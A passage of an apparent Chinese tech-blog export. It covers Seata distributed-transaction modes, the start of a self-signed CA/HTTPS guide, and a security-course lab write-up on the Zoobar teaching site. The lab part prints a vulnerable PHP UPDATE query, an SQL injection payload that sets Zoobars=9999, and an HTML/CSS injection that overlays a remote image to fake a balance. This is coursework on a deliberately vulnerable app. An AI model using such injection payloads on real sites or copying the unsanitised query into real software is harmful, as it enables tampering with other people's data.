<p>针对事务无法回滚的问题，有人提出说可以再事务参与者执行失败后，再次利用MQ通知消息服务，然后由消息服务通知其他参与者回滚。那么，恭喜你，你利用MQ和自定义的消息服务再次实现了2PC 模型，又造了一个大轮子</p>
<h3 id="AT模式"><a href="#AT模式" class="headerlink" title="AT模式"></a>AT模式</h3><p>2019年 1 月份，Seata 开源了 AT 模式。AT 模式是一种<strong>无侵入</strong>的分布式事务解决方案。可以看做是对TCC模型的一种优化，解决了TCC模式中的代码侵入、编码复杂等问题。</p>
<p>在 AT 模式下，用户只需关注自己的“业务 SQL”，用户的 “业务 SQL” 作为一阶段，Seata 框架会自动生成事务的二阶段提交和回滚操作。</p>
<p>可以参考Seata的<a href="https://seata.io/zh-cn/docs/dev/mode/at-mode.html">官方文档</a>。</p>
<h4 id="基本原理-2"><a href="#基本原理-2" class="headerlink" title="基本原理"></a>基本原理</h4><p>先来看一张流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149754.png" alt="image-20200305212340203"></p>
<p>有没有感觉跟TCC的执行很像，都是分两个阶段：</p>
<ul>
<li>一阶段：执行本地事务，并返回执行结果</li>
<li>二阶段：根据一阶段的结果，判断二阶段做法：提交或回滚</li>
</ul>
<p>但AT模式底层做的事情可完全不同，而且第二阶段根本不需要我们编写，全部有Seata自己实现了。也就是说：我们写的<strong>代码与本地事务时代码一样</strong>，无需手动处理分布式事务。</p>
<p>那么，AT模式如何实现无代码侵入，如何帮我们自动实现二阶段代码的呢？</p>
<blockquote>
<p>一阶段</p>
</blockquote>
<p>在一阶段，Seata 会拦截“业务 SQL”，首先解析 SQL 语义，找到“<code>业务 SQL</code>”要更新的业务数据，在业务数据被更新前，将其保存成“<code>before image</code>”，然后执行“<code>业务 SQL</code>”更新业务数据，在业务数据更新之后，再将其保存成“<code>after image</code>”，最后获取全局行锁，<strong>提交事务</strong>。以上操作全部在一个数据库事务内完成，这样保证了一阶段操作的原子性。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149755.png" alt="image-20200305213652558"></p>
<blockquote>
<p>二阶段提交</p>
</blockquote>
<p>二阶段如果是提交的话，因为“<code>业务 SQL</code>”在一阶段已经提交至数据库， 所以 Seata 框架只需将一阶段保存的快照数据和行锁删掉，完成数据清理即可。</p>
<blockquote>
<p>二阶段回滚：</p>
</blockquote>
<p>二阶段如果是回滚的话，Seata 就需要回滚一阶段已经执行的“<code>业务 SQL</code>”，还原业务数据。回滚方式便是用“<code>before image</code>”还原业务数据；但在还原前要首先要校验脏写，对比“数据库当前业务数据”和 “<code>after image</code>”，如果两份数据完全一致就说明没有脏写，可以还原业务数据，如果不一致就说明有<code>脏写</code>，出现脏写就需要转人工处理。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149756.png" alt="image-20200305214649845"></p>
<p>不过因为有全局锁机制，所以可以降低出现<code>脏写</code>的概率。</p>
<p>AT 模式的一阶段、二阶段提交和回滚均由 Seata 框架自动生成，用户只需编写“业务 SQL”，便能轻松接入分布式事务，AT 模式是一种对业务无任何侵入的分布式事务解决方案。</p>
<h4 id="详细架构和流程"><a href="#详细架构和流程" class="headerlink" title="详细架构和流程"></a>详细架构和流程</h4><p>Seata中的几个基本概念：</p>
<ul>
<li><p>TC（Transaction Coordinator） - 事务协调者</p>
<p>维护全局和分支事务的状态，驱动全局事务提交或回滚（TM之间的协调者）。</p>
</li>
<li><p>TM（Transaction Manager） - 事务管理器</p>
<p>定义全局事务的范围：开始全局事务、提交或回滚全局事务。</p>
</li>
<li><p>RM（Resource Manager） - 资源管理器</p>
<p>管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。</p>
</li>
</ul>
<p>我们看下面的一个架构图</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149757.png" alt="image-20200305225811888"></p>
<ul>
<li>TM：业务模块中全局事务的开启者<ul>
<li>向TC开启一个全局事务</li>
<li>调用其它微服务</li>
</ul>
</li>
<li>RM：业务模块执行者中，包含RM部分，负责向TC汇报事务执行状态<ul>
<li>执行本地事务</li>
<li>向TC注册分支事务，并提交本地事务执行结果</li>
</ul>
</li>
<li>TM：结束对微服务的调用，通知TC，全局事务执行完毕，事务一阶段结束</li>
<li>TC：汇总各个分支事务执行结果，决定分布式事务是提交还是回滚；</li>
<li>TC 通知所有 RM 提交&#x2F;回滚 资源，事务二阶段结束。</li>
</ul>
<p>一阶段：</p>
<ul>
<li>TM开启全局事务，并向TC声明全局事务，包括全局事务XID信息</li>
<li>TM所在服务调用其它微服务</li>
<li>微服务，主要有RM来执行<ul>
<li>查询<code>before_image</code></li>
<li>执行本地事务</li>
<li>查询<code>after_image</code></li>
<li>生成<code>undo_log</code>并写入数据库</li>
<li>向TC注册分支事务，告知事务执行结果</li>
<li>获取全局锁（阻止其它全局事务并发修改当前数据）</li>
<li>释放本地锁（不影响其它业务对数据的操作）</li>
</ul>
</li>
<li>待所有业务执行完毕，事务发起者（TM）会尝试向TC提交全局事务</li>
</ul>
<p>二阶段：</p>
<ul>
<li>TC统计分支事务执行情况，根据结果判断下一步行为<ul>
<li>分支都成功：通知分支事务，提交事务</li>
<li>有分支执行失败：通知执行成功的分支事务，回滚数据</li>
</ul>
</li>
<li>分支事务的RM<ul>
<li>提交事务：直接清空<code>before_image</code>和<code>after_image</code>信息，释放全局锁</li>
<li>回滚事务：<ul>
<li>校验after_image，判断是否有脏写</li>
<li>如果没有脏写，回滚数据到<code>before_image</code>，清除<code>before_image</code>和<code>after_image</code></li>
<li>如果有脏写，请求人工介入</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h4><p>详见Seata的官方文档：<a href="https://seata.io/zh-cn/docs/overview/what-is-seata.html">https://seata.io/zh-cn/docs/overview/what-is-seata.html</a></p>
<blockquote>
<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></blockquote>
<p>以一个示例来说明整个 AT 分支的工作过程。</p>
<p>业务表：<code>product</code></p>
<table>
<thead>
<tr>
<th>Field</th>
<th>Type</th>
<th>Key</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>bigint(20)</td>
<td>PRI</td>
</tr>
<tr>
<td>name</td>
<td>varchar(100)</td>
<td></td>
</tr>
<tr>
<td>since</td>
<td>varchar(100)</td>
<td></td>
</tr>
</tbody></table>
<p>AT 分支事务的业务逻辑：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> product <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;GTS&#x27;</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<h4 id="一阶段"><a href="#一阶段" class="headerlink" title="一阶段"></a>一阶段</h4></blockquote>
<p>过程：</p>
<ol>
<li>解析 SQL：得到 SQL 的类型（UPDATE），表（product），条件（where name &#x3D; ‘TXC’）等相关的信息。</li>
<li>查询前镜像：根据解析得到的条件信息，生成查询语句，定位数据。</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, since <span class="keyword">from</span> product <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>得到前镜像：</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>since</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>TXC</td>
<td>2014</td>
</tr>
</tbody></table>
<ol>
<li>执行业务 SQL：更新这条记录的 name 为 ‘GTS’。</li>
<li>查询后镜像：根据前镜像的结果，通过 <strong>主键</strong> 定位数据。</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, since <span class="keyword">from</span> product <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>`;</span><br></pre></td></tr></table></figure>

<p>得到后镜像：</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>since</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>GTS</td>
<td>2014</td>
</tr>
</tbody></table>
<ol>
<li>插入回滚日志：把前后镜像数据以及业务 SQL 相关的信息组成一条回滚日志记录，插入到 <code>UNDO_LOG</code> 表中。</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;branchId&quot;</span><span class="punctuation">:</span> <span class="number">641789253</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;undoItems&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;afterImage&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;rows&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GTS&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;since&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2014&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;beforeImage&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;rows&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TXC&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;since&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2014&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;sqlType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UPDATE&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;xid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xid:xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>提交前，向 TC 注册分支：申请 <code>product</code> 表中，主键值等于 1 的记录的 <strong>全局锁</strong> 。</li>
<li>本地事务提交：业务数据的更新和前面步骤中生成的 UNDO LOG 一并提交。</li>
<li>将本地事务提交的结果上报给 TC。</li>
</ol>
<blockquote>
<h4 id="二阶段-回滚"><a href="#二阶段-回滚" class="headerlink" title="二阶段-回滚"></a>二阶段-回滚</h4></blockquote>
<ol>
<li>收到 TC 的分支回滚请求，开启一个本地事务，执行如下操作。</li>
<li>通过 XID 和 Branch ID 查找到相应的 UNDO LOG 记录。</li>
<li>数据校验：拿 UNDO LOG 中的后镜与当前数据进行比较，如果有不同，说明数据被当前全局事务之外的动作做了修改。这种情况，需要根据配置策略来做处理，详细的说明在另外的文档中介绍。</li>
<li>根据 UNDO LOG 中的前镜像和业务 SQL 的相关信息生成并执行回滚的语句：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> product <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li>提交本地事务。并把本地事务的执行结果（即分支事务回滚的结果）上报给 TC。</li>
</ol>
<blockquote>
<h4 id="二阶段-提交"><a href="#二阶段-提交" class="headerlink" title="二阶段-提交"></a>二阶段-提交</h4></blockquote>
<ol>
<li>收到 TC 的分支提交请求，把请求放入一个异步任务的队列中，马上返回提交成功的结果给 TC。</li>
<li>异步任务阶段的分支提交请求将异步和批量地删除相应 UNDO LOG 记录。</li>
</ol>
<h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><p>优点：</p>
<ul>
<li>与2PC相比：每个分支事务都是独立提交，不互相等待，减少了资源锁定和阻塞时间</li>
<li>与TCC相比：二阶段的执行操作全部自动化生成，无代码侵入，开发成本低</li>
</ul>
<p>缺点：</p>
<ul>
<li>与TCC相比，需要动态生成二阶段的反向补偿操作，执行性能略低于TCC</li>
</ul>
<h3 id="Saga模式"><a href="#Saga模式" class="headerlink" title="Saga模式"></a>Saga模式</h3><p>Saga [ˈsɑːɡə]模式是 Seata 即将开源的长事务解决方案，将由蚂蚁金服主要贡献。</p>
<p>其理论基础是Hector &amp; Kenneth  在1987年发表的论文<a href="https://microservices.io/patterns/data/saga.html">Sagas</a>。</p>
<p>Seata官网对于Saga的指南：<a href="https://seata.io/zh-cn/docs/user/saga.html">https://seata.io/zh-cn/docs/user/saga.html</a></p>
<h4 id="基本模型"><a href="#基本模型" class="headerlink" title="基本模型"></a>基本模型</h4><p>在 Saga 模式下，分布式事务内有多个参与者，每一个参与者都是一个冲正补偿服务，需要用户根据业务场景实现其正向操作和逆向回滚操作。</p>
<p>分布式事务执行过程中，依次执行各参与者的正向操作，如果所有正向操作均执行成功，那么分布式事务提交。如果任何一个正向操作执行失败，那么分布式事务会去退回去执行前面各参与者的逆向回滚操作，回滚已提交的参与者，使分布式事务回到初始状态。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149758.png" alt="Saga 模式"> </p>
<p>Saga 模式下分布式事务通常是由事件驱动的，各个参与者之间是异步执行的，Saga 模式是一种长事务解决方案。</p>
<h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><ul>
<li>业务流程长、业务流程多</li>
<li>参与者包含其它公司或遗留系统服务，无法提供 TCC 模式要求的三个接口</li>
</ul>
<h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul>
<li>一阶段提交本地事务，无锁，高性能</li>
<li>事件驱动架构，参与者可异步执行，高吞吐</li>
<li>补偿服务易于实现</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>不保证隔离性（应对方案见<a href="https://seata.io/zh-cn/docs/user/saga.html">用户文档</a>）</li>
</ul>
<h2 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a>Seata</h2><p>Seata（Simple Extensible Autonomous Transaction Architecture，简单可扩展自治事务框架）是 2019 年 1 月份蚂蚁金服和阿里巴巴共同开源的分布式事务解决方案。Seata 开源半年左右，目前已经有接近一万 star，社区非常活跃。我们热忱欢迎大家参与到 Seata 社区建设中，一同将 Seata 打造成开源分布式事务标杆产品。</p>
<p>Seata：<a href="https://github.com/seata/seata">https:&#x2F;&#x2F;</a><a href="https://github.com/seata/seata">github.com&#x2F;seata&#x2F;seata</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149759.png" alt="image-20210415162035629"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149760.png" alt="image-20210415162052256"></p>
<h3 id="AT模式实战"><a href="#AT模式实战" class="headerlink" title="AT模式实战"></a>AT模式实战</h3><p>首先在application.yml中添加一行配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">alibaba:</span></span><br><span class="line">      <span class="attr">seata:</span></span><br><span class="line">        <span class="attr">tx-service-group:</span> <span class="string">test_tx_group</span> <span class="comment"># 定义事务组的名称</span></span><br></pre></td></tr></table></figure>

<p>这里是定义事务组的名称，接下来会用到。</p>
<p>然后是在<code>resources</code>目录下放两个配置文件：<code>file.conf</code>和<code>registry.conf</code></p>
<p>其中，<code>registry.conf</code>与TC服务端的一样，此处不再讲解。</p>
<p>Seata的二阶段执行是通过拦截sql语句，分析语义来指定回滚策略，因此需要对DataSource做代理。我们在项目的<code>cn.itcast.order.config</code>包中，添加一个配置类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.order.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.datasource.DataSourceProxy;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataSourceProxyConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactory <span class="title function_">sqlSessionFactoryBean</span><span class="params">(DataSource dataSource)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 订单服务中引入了mybatis-plus，所以要使用特殊的SqlSessionFactoryBean</span></span><br><span class="line">        <span class="type">MybatisSqlSessionFactoryBean</span> <span class="variable">sqlSessionFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisSqlSessionFactoryBean</span>();</span><br><span class="line">        <span class="comment">// 代理数据源</span></span><br><span class="line">        sqlSessionFactoryBean.setDataSource(<span class="keyword">new</span> <span class="title class_">DataSourceProxy</span>(dataSource));</span><br><span class="line">        <span class="comment">// 生成SqlSessionFactory</span></span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，这里因为订单服务使用了mybatis-plus这个框架（这是一个mybatis集成框架，自动生成单表Sql），因此我们需要用mybatis-plus的<code>MybatisSqlSessionFactoryBean</code>代替<code>SqlSessionFactoryBean</code></p>
<p>如果用的是原生的mybatis，请使用<code>SqlSessionFactoryBean</code>。</p>
<p>添加事务注解</p>
<p>给事务发起者<code>order_service</code>的<code>OrderServiceImpl</code>中的<code>createOrder()</code>方法添加<code>@GlobalTransactional</code>注解，开启全局事务</p>
<h1 id="微信支付"><a href="#微信支付" class="headerlink" title="微信支付"></a>微信支付</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149762.png" alt="image-20210415162630464"></p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全实践Lab2-CSS</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab2-CSS/</url>
    <content><![CDATA[<h1 id="信息安全实践Lab2-CSS"><a href="#信息安全实践Lab2-CSS" class="headerlink" title="信息安全实践Lab2-CSS"></a>信息安全实践Lab2-CSS</h1><h2 id="Ubuntu20-04-安装-php5-6-，php5-6-mysql，apache2，mysql5-7"><a href="#Ubuntu20-04-安装-php5-6-，php5-6-mysql，apache2，mysql5-7" class="headerlink" title="Ubuntu20.04 安装 php5.6 ，php5.6-mysql，apache2，mysql5.7"></a>Ubuntu20.04 安装 php5.6 ，php5.6-mysql，apache2，mysql5.7</h2><h3 id="安装php5-6，php5-6-mysql，apache2"><a href="#安装php5-6，php5-6-mysql，apache2" class="headerlink" title="安装php5.6，php5.6-mysql，apache2"></a>安装php5.6，php5.6-mysql，apache2</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y language-pack-en-base</span><br><span class="line"></span><br><span class="line">sudo LC_ALL=en_US.UTF-8 add-apt-repository ppa:ondrej/php</span><br><span class="line"></span><br><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install php5.6</span><br><span class="line"></span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"></span><br><span class="line">sudo apt-get apache2</span><br><span class="line"></span><br><span class="line">sudo a2dismod php7.4</span><br><span class="line"></span><br><span class="line">sudo a2enmod php5.6</span><br><span class="line"></span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>

<h3 id="安装mysql5-7"><a href="#安装mysql5-7" class="headerlink" title="安装mysql5.7"></a>安装mysql5.7</h3><p><a href="https://blog.csdn.net/Deadly_97/article/details/111675825">https://blog.csdn.net/Deadly_97/article/details/111675825</a></p>
<h2 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h2><h2 id="问题2-Zoobar网站寻找漏洞"><a href="#问题2-Zoobar网站寻找漏洞" class="headerlink" title="问题2:Zoobar网站寻找漏洞"></a>问题2:Zoobar网站寻找漏洞</h2><p>Manage your profile in the zoobar website, make your zoobars appear more than you really own. That is, after you modify your profile, when others or yourself look up your profile, they will see more zoobars than you actually own.</p>
<h3 id="方法一：利用css"><a href="#方法一：利用css" class="headerlink" title="方法一：利用css"></a>方法一：利用css</h3><ol>
<li><p>在a用户的profile中输入</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=&quot;http://<span class="number">106.13</span>.<span class="number">136.87</span>:<span class="number">8080</span>/<span class="number">100</span>.png<span class="string">&quot; style=&quot;</span>position:relative;<span class="attribute">top</span>:-<span class="number">55px</span>;<span class="attribute">right</span>:-<span class="number">63px</span>;<span class="attribute">width</span>:<span class="number">34px</span>;<span class="attribute">height</span>:<span class="number">21px</span><span class="string">&quot;/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后b用户在User中输入用户名a，就会看到a有100个zoobars，其实a并没有100个</p>
</li>
</ol>
<h2 id="方法二：sql注入"><a href="#方法二：sql注入" class="headerlink" title="方法二：sql注入"></a>方法二：sql注入</h2><ol>
<li><p>源码中，处理$profile参数sql语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE Person SET Profile=&#x27;$profile&#x27; &quot;.</span><br><span class="line">           &quot;WHERE PersonID=$user-&gt;id&quot;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>假设第一个用户a在profile中输入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;,Zoobars=9999,Profile=&#x27;</span>Welcome <span class="keyword">to</span> my profile<span class="operator">!</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>最后执行的sql如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> Person <span class="keyword">set</span> Profile<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,Zoobars<span class="operator">=</span><span class="number">9999</span>,Profile<span class="operator">=</span><span class="string">&#x27;Welcome to my profile!&#x27;</span> <span class="keyword">where</span> PeronID<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>最后再去查a的余额就有9999个zoobars</p>
</li>
</ol>
]]></content>
      <categories>
        <category>信息安全实践</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全实践Lab1-自建CA证书搭建https服务器</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab1-%E8%87%AA%E5%BB%BACA%E8%AF%81%E4%B9%A6%E6%90%AD%E5%BB%BAhttps%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h1 id="信息安全实践Lab1-自建CA证书搭建https服务器"><a href="#信息安全实践Lab1-自建CA证书搭建https服务器" class="headerlink" title="信息安全实践Lab1-自建CA证书搭建https服务器"></a>信息安全实践Lab1-自建CA证书搭建https服务器</h1><h2 id="搭建https服务器"><a href="#搭建https服务器" class="headerlink" title="搭建https服务器"></a>搭建https服务器</h2><p>本机环境： Ubuntu 20.04  OpenSSL 1.1.1f Firefox Browser 79.0(64-bit)</p>
<h3 id="安装OpenSSL"><a href="#安装OpenSSL" class="headerlink" title="安装OpenSSL"></a>安装OpenSSL</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="language-bash">sudo apt-get install openssl</span></span><br></pre></td></tr></table></figure>

<h3 id="自建CA"><a href="#自建CA" class="headerlink" title="自建CA"></a>自建CA</h3><p>建立myCA目录用于存放CA相关信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd &amp;&amp; mkdir -p myCA/signedcerts &amp;&amp; mkdir myCA/private &amp;&amp; cd myCA</span><br></pre></td></tr></table></figure>

<p>myCA 用于存放 CA 根证书，证书数据库，以及后续服务器生成的证书，密钥以及请求<br>signedcerts:保存签名证书的 copy<br>private: 包含私钥</p>
<p>配置myCA相关参数，在myCA目录下进行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;01&#x27;&gt;serial &amp;&amp; touch index.txt</span><br></pre></td></tr></table></figure>

<p>创建caconfig.cnf文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install vim</span><br><span class="line">vim ~/myCA/caconfig.cnf</span><br></pre></td></tr></table></figure>

<p>caconfig.cnf文件内容如下：</p>
<p>注意文件中两个地方的username需要换成你自己的用户名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">My sample caconfig.cnf file.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Default configuration to use when one is not provided on the command line.</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ ca ]</span></span><br><span class="line">default_ca      = local_ca</span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Default location of directories and files needed to generate 